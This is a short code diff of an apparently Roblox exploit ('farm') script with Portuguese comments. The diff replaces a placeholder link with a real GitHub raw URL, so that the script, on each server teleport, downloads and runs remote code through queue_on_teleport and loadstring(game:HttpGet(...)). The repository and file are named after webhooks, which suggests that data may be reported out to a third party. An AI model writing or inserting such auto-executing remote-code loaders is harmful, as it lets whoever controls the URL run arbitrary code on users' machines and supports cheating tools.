@@ -218,7 +218,7 @@ end
 
 -- Auto-execução ao trocar de servidor
 if queue_on_teleport then
-    queue_on_teleport([[loadstring(game:HttpGet("SEU_LINK_AQUI"))()]])
+    queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/Galaxy-BloxYT/Webhooks/refs/heads/main/Webhook%20%7C%20notice"))()]])
 end
 
 task.spawn(runFarm)
